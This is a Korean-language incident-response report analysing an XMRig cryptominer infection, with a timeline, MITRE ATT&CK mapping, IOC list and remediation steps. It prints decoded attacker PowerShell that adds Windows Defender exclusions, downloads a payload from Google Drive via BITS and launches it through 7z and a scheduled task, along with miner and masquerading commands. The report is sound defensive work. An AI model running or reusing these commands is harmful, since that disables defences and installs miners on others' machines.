# 침해사고 분석 보고서 — XMRig 크립토마이너 (2026-06-18)

> **사고 유형**: 단말 침해 / XMRig 크립토마이닝 + 다단계 지속성 메커니즘  
> **심각도**: `Critical`  
> **대상**: 김차장 PC (`<VICTIM_IP>` / `<VICTIM_USER>`)  
> **사고 발생**: 2026-06-18 / **분석 완료**: 2026-06-19  
> **분석 등급**: Tier 3 / **분류**: 내부 기밀

---

## 요약 지표

| 항목 | 값 |
|------|-----|
| 최초 C2 통신 | 2026-06-18 13:33 KST |
| XDR 재연결 | 2026-06-18 14:04 KST |
| 확인된 IOC | 14개 |
| Forensics 수집 건수 | 11,170건 |
| investigation_id | `<INVESTIGATION_ID>` |
| collection_id | `<COLLECTION_ID>` |

---

## 1. 개요 및 침해 범위

2026년 6월 18일, 사용자 `<VICTIM_USER>`(김차장)의 Windows 11 단말(`<VICTIM_IP>`)에서 XMRig 기반 Monero 크립토마이너가 탐지됐다.

Cortex XDR는 반복 스케줄드 태스크를 차단했으나, 초기 실행 구간(XDR 오프라인 기간, ~13:03–14:04 KST)에 대한 실시간 텔레메트리는 부재하며, Forensics 수집 데이터(11,170건)를 통한 사후 재구성으로 전체 공격 체인이 확인됐다.

공격자는 단순 마이너 설치를 넘어 **Windows Defender 예외 등록**, **Google Drive 기반 페이로드 다운로더**, **자기복구 루프**, **3중 Base64 인코딩 페이로드**를 포함한 지속적인 C2 인프라를 구축했다. 이는 스크립트 키디 수준이 아닌 숙련된 위협 행위자의 작업 패턴이며, 최종 페이로드(`UVxOHL_10240` 태스크)의 목적이 마이닝 단독인지 추가 목표(크리덴셜 탈취, 래터럴 무브먼트)가 있는지는 현재 미확인 상태다.

---

## 2. 공격 흐름 요약

```
[초기 유입]     Hwp.exe / 네트워크 공유 PPTX (벡터 미확정, XDR 오프라인)
    │
    ▼
[마스커레이딩]  powershell.exe → C:\Windows\svchost.exe 복사 [T1036.005]
                powershell.exe → C:\ProgramData\KB5019959.exe 복사
    │
    ▼
[방어 회피]     Windows Defender ExclusionPath/ExclusionProcess 등록 [T1562.001]
                3중 Base64 인코딩 페이로드 (PowerShell -EncodedCommand) [T1027]
    │
    ▼
[실행]          svchost.exe (위장 powershell) → XMRig rx/0 마이닝 시작 [T1496]
                cmd.exe → ssl-maimai.com:27039 연결
    │
    ▼
[지속성]        CriticalUpdate(LUR) 스케줄드 태스크 (30분 간격 자기복구) [T1053.005]
                GoogleUpdateTaskSYSTEM → BITS Transfer 다운로더 [T1197]
    │
    ▼
[추가 페이로드] Google Drive → .png.001 (7z 아카이브) 다운로드 [T1105]
                7z.exe 압축 해제 → UVxOHL_10240 태스크 실행 (내용 미확인)
```

---

## 3. 공격 타임라인 (KST, 2026-06-18)

| 시각 | 이벤트 | MITRE |
|------|--------|-------|
| ~13:03 | `Hwp.exe` (한글 2024) 마지막 실행 — BAM 기록 (`<VICTIM_USER>`). 최초 유입 벡터 유력 후보. XDR 오프라인 기간 중 발생 | T1204.002 |
| ~13:33 | `C:\Windows\svchost.exe` → `65.21.239.189:27039` XMRig 최초 마이닝 풀 연결 (`cmd.exe -a rx/0 --url ssl-maimai.com:27039`) | T1496 |
| ~14:04 | XDR 에이전트 재연결 → 버퍼 이벤트 일괄 업로드. Defender 예외 등록 이벤트 수신 | T1562.001 |
| ~14:47 | `cmd.exe /c copy SysWow64\powershell.exe C:\ProgramData\KB5019959.exe` — CriticalUpdate(LUR) 자기복구 루프 탐지 | T1053.005 |
| 14:51 | `ms-gamingoverlay---.lnk`, `ms-gamingoverlay--kglcheck-.lnk` 생성 (target_path 없음, 1초 간격) | T1547 |
| ~15:33 | `파일.lnk` → `C:\WINDOWS\system32\config\systemprofile\Desktop\파일` — SYSTEM 계정 Desktop 경로 접근 | T1083 |
| ~16:55 | Cortex XDR Forensics 수집 완료 (11,170건) | — |

---

## 4. 다단계 공격 체인 상세 분석

---

### 단계 0 — 초기 유입 (벡터 미확정)

XDR 오프라인 기간(~13:03–14:04 KST) 중 발생, `xdr_data` 프로세스 생성 이벤트 없음.

**유력 후보 2개:**
- `Hwp.exe` (한글 2024) — BAM 기록 기준 13:03 KST, XMRig 최초 연결 30분 전
- `\\<FILESERVER_IP>\gt00\` 네트워크 공유 PPTX — 전일 열람 확인

HWP 악성 문서(OLE 익스플로잇) 또는 PPTX 매크로 가능성 모두 배제 불가.

---

### 단계 1 — 마스커레이딩 [T1036.005]

`powershell.exe` → `C:\Windows\svchost.exe` 복사:

```
SHA1: 0b2e795525166044e6c2b8527b5f01571b4e6718
크기: 423,424 B (32비트 SysWOW64 powershell)
경로: C:\Windows\svchost.exe  ← System32 외부, 비정상
```

**판별 기준 3가지:**
1. `C:\Windows\` 루트 경로 (정상은 `System32\`)
2. `-k [서비스명]` 인수 없음
3. XMRig `cmd.exe`가 직접 자식 프로세스

**Prefetch 확인**: `SVCHOST.EXE-2A35E6EF.pf` — 정상 SYSTEM32 경로와 다른 해시값 → 별도 실행 파일 확정

---

### 단계 2 — Windows Defender 예외 등록 [T1562.001]

`C:\Windows\svchost.exe -e [Base64 Layer2]` 실행. **디코딩 결과 (UTF-16LE, 2단 Base64):**

```powershell
Add-MpPreference -ExclusionPath @('C:\ProgramData\Google') `
  -ExclusionProcess @(
    'software_reporter_tool.exe',
    'svchost.exe',
    'KB5019959.exe',
    'cmd.exe',
    'GoogleUpdate.exe',
    'powershell.exe'
  )
```

`C:\ProgramData\Google` 전체 경로와 핵심 프로세스명을 Defender 스캔 예외로 등록. 이후 해당 경로의 모든 악성 파일 탐지 불가.

---

### 단계 3 — XMRig 마이닝 실행 [T1496]

```
마이닝 풀:  ssl-maimai.com:27039  (IP: 65.21.239.189)
알고리즘:   rx/0 (RandomX — CPU 집약적 Monero 알고리즘)
워커 ID:    43b1fdda-f121-4f80-8832-ff29b7007739
```

`SysWOW64 cmd.exe`가 `tasklist | find` 실행 — 기존 마이너 프로세스 생존 확인 패턴.

---

### 단계 4 — 자기복구 루프 [T1053.005]

**CriticalUpdate(LUR) 스케줄드 태스크** — 30분 간격 반복:

```
cmd.exe /c copy SysWow64\powershell.exe C:\ProgramData\KB5019959.exe
→ KB5019959.exe -e [Base64 Layer1]
```

**Layer 1 디코딩 결과:**

```powershell
powershell cmd.exe /c copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\svchost.exe;
C:\Windows\svchost.exe -e [Layer2_Base64]
```

XDR 차단 시에도 다음 트리거(30분 후)에서 재시도하는 자기복구 메커니즘. `KB5019959.exe`는 KB 패치 파일로 위장.

---

### 단계 5 — Google Drive 페이로드 다운로더 [T1105, T1197]

**GoogleUpdateTaskSYSTEM** 태스크 → `C:\Windows\svchost.exe -e [Base64 Layer3]`

**Layer 3 디코딩 결과 (UTF-16LE, 3단 Base64):**

```powershell
Start-Sleep 80

Start-BitsTransfer `
  'https://www.googleapis.com/drive/v3/files/1FIdeFWuXuwHgvxy1c3q6Xv2BFYaKMS0O?alt=media&key=AIzaSyD94KbMUwXmWDriqj2UQGL_TRXNg51y1q8&supportAllDrives=True' `
  'C:\ProgramData\Google\.png.001'

cmd.exe /c "C:\ProgramData\Google\7z.exe" x -oC:\ProgramData\Google\ C:\ProgramData\Google\.png.001 -px -y

Start-ScheduledTask -TaskPath "\Microsoft\Windows\UVxOHL_10240..."
```

| 항목 | 내용 |
|------|------|
| `Start-Sleep 80` | 동적 분석 샌드박스 우회 (80초 대기) |
| `Start-BitsTransfer` | BITS 서비스 악용 — 일부 보안 솔루션 우회 |
| `.png.001` | PNG 위장 7z 아카이브 (비밀번호 보호) |
| `-px` | 7z 비밀번호 인수 (값 잘림 — 추출 미완료) |
| `UVxOHL_10240` | 압축 해제 후 실행되는 최종 태스크 — 내용 미확인 |

---

## 5. 3중 Base64 인코딩 구조

```
KB5019959.exe -e [Layer1_Base64]
    │ 디코딩 (UTF-16LE)
    ▼
  powershell.exe → svchost.exe 복사 + svchost.exe -e [Layer2_Base64]
                                          │ 디코딩 (UTF-16LE)
                                          ▼
                                    Add-MpPreference (Defender 예외)
                                    + svchost.exe -e [Layer3_Base64]
                                                        │ 디코딩 (UTF-16LE)
                                                        ▼
                                                  BitsTransfer + 7z + Task
```

각 레이어는 `[Convert]::FromBase64String()` + `[System.Text.Encoding]::Unicode.GetString()` 으로 디코딩 (PowerShell `-EncodedCommand` 표준 UTF-16LE).

---

## 6. MITRE ATT&CK 매핑

| ID | 기법 | 사용 방식 |
|----|------|----------|
| T1204.002 | User Execution: Malicious File | HWP/PPTX 통한 초기 실행 (추정) |
| T1036.005 | Masquerading: Match Legitimate Name | svchost.exe, KB5019959.exe 위장 |
| T1027 | Obfuscated Files or Information | 3중 Base64 인코딩 페이로드 |
| T1140 | Deobfuscate/Decode Files or Information | PowerShell -EncodedCommand 실행 |
| T1059.001 | Command and Scripting: PowerShell | 전 단계 실행 도구 |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defender ExclusionPath/Process 등록 |
| T1053.005 | Scheduled Task/Job | CriticalUpdate(LUR), GoogleUpdateTaskSYSTEM |
| T1105 | Ingress Tool Transfer | Google Drive → .png.001 다운로드 |
| T1197 | BITS Jobs | Start-BitsTransfer 악용 |
| T1496 | Resource Hijacking | XMRig Monero 마이닝 |
| T1547 | Boot or Logon Autostart Execution | ms-gamingoverlay LNK (목적 미확인) |
| T1083 | File and Directory Discovery | SYSTEM 경로 접근 |
| T1218 | System Binary Proxy Execution | 7z.exe LOLBAS 악용 |

---

## 7. 확인된 IOC 전체 목록

| 분류 | 값 | 심각도 | 비고 |
|------|-----|--------|------|
| Hash (SHA1) | `0b2e795525166044e6c2b8527b5f01571b4e6718` | Critical | svchost.exe = KB5019959.exe (32비트 powershell 복사) |
| IP:Port | `65.21.239.189:27039` | Critical | XMRig Monero 마이닝 풀 서버 |
| Domain | `ssl-maimai.com` | Critical | 마이닝 풀 도메인 (ssl:// 27039) |
| Wallet ID | `43b1fdda-f121-4f80-8832-ff29b7007739` | High | XMRig --user 인수, 마이너 식별자 |
| File Path | `C:\Windows\svchost.exe` | Critical | System32 외 경로 — 마스커레이딩 |
| File Path | `C:\ProgramData\KB5019959.exe` | Critical | KB 패치 위장 32비트 powershell |
| File Path | `C:\ProgramData\Google\7z.exe` | High | 공격자 스테이징 7-Zip |
| File Path | `C:\ProgramData\Google\.png.001` | High | PNG 위장 7z 아카이브 (비밀번호 보호) |
| Google Drive ID | `1FIdeFWuXuwHgvxy1c3q6Xv2BFYaKMS0O` | Critical | 페이로드 배포 Google Drive 파일 |
| Google API Key | `AIzaSyD94KbMUwXmWDriqj2UQGL_TRXNg51y1q8` | High | BITS Transfer에 사용된 API 키 |
| Task Path | `\Microsoft\Windows\Google\GoogleUpdateTaskSYSTEM` | Critical | 다운로더 태스크 (Google Update 위장) |
| Task Name | `CriticalUpdate(LUR)` | Critical | 30분 간격 자기복구 태스크 |
| Task Path | `\Microsoft\Windows\UVxOHL_10240...` | High | 최종 페이로드 태스크 — 내용 미확인 |
| Network Share | `\\<FILESERVER_IP>\gt00\` | High | PPTX 수신 공유 서버, 초기 유입 후보 |

---

## 8. 미해결 사항 및 분석 한계

### ❓ 최초 유입 벡터 미확정
XDR 오프라인 기간(~13:03–14:04 KST) 중 발생. BAM 기준 `Hwp.exe`(13:03), 네트워크 공유 PPTX(전일)가 유력 후보이나 프로세스 생성 이벤트 없음. HWP 악성 문서(한글 OLE 익스플로잇) 또는 PPTX 매크로 가능성 모두 배제 불가.

### ❓ `.png.001` 최종 페이로드 내용 불명
7z 비밀번호(`-px` 이후 값 잘림) 및 압축 해제 후 파일 목록 미확인. `UVxOHL_10240` 태스크가 실행하는 최종 바이너리 정체 불명. 래터럴 무브먼트, 크리덴셜 덤프 등 추가 목적 가능성 배제 불가.

### ❓ `ms-gamingoverlay` LNK 파일 목적 불명
`target_path` 없는 2건의 LNK(14:51 KST, 1초 간격). 감염 후 공격자 추가 작업 또는 소셜 엔지니어링 전파 시도 가능성.

### ❓ 네트워크 공유 서버 감염 여부 불명
`\\<FILESERVER_IP>\gt00\`는 다른 사용자도 접근 가능한 공유 서버. 동일 악성 파일의 전파 경로가 됐을 가능성. 서버 측 Forensics 수집 필요.

---

## 9. 즉시 조치 권고

### 🔴 즉시 (0–1시간)

1. **단말 격리** — XSIAM `isolate_endpoint` 실행. `UVxOHL_10240` 최종 페이로드 목적 확인 전까지 네트워크 격리 유지.
2. **Google Drive 신고** — File ID `1FIdeFWuXuwHgvxy1c3q6Xv2BFYaKMS0O` 및 API Key `AIzaSyD94KbMUwXmWDriqj2UQGL_TRXNg51y1q8` Google Trust & Safety 신고 및 차단.
3. **IOC 등록** — SHA1 `0b2e795525166044e6c2b8527b5f01571b4e6718`, `ssl-maimai.com`, `65.21.239.189` XSIAM Threat Intel 즉시 등록. 전사 스캔 실행.

### 🟠 당일 (1–8시간)

4. **`<FILESERVER_IP>` 공유 서버 조사** — `\\<FILESERVER_IP>\gt00\` 서버의 PPTX 파일 해시 확인 및 Forensics 수집. 동일 공유 접근 사용자 전원 식별.
5. **`C:\ProgramData\Google` 분석** — 격리 후 7z 비밀번호 추출 및 `.png.001` 압축 해제 내용 확인. `UVxOHL_10240` 태스크 XML 수동 추출.

### 🟡 48시간 이내

6. **HWP 악성 문서 추적** — Forensics `recent_files` 전체 조회로 HWP 파일 경로 확인. 존재 시 OLE 객체 분석 및 악성 여부 판정.
7. **`ms-gamingoverlay` LNK 분석** — LNK 파일 hex 분석으로 실제 target 확인. 배포된 동일 LNK가 다른 단말에 존재하는지 전사 Forensics 확인.
8. **XDR 오프라인 원인 조사** — 공격자가 의도적으로 에이전트를 종료했는지 여부 확인. 에이전트 서비스 중단 이벤트 Windows 이벤트 로그 확인.

---

*분석: Tier 3 위협 분석팀 / 2026-06-18 사고 발생 → 2026-06-19 보고서 완료*
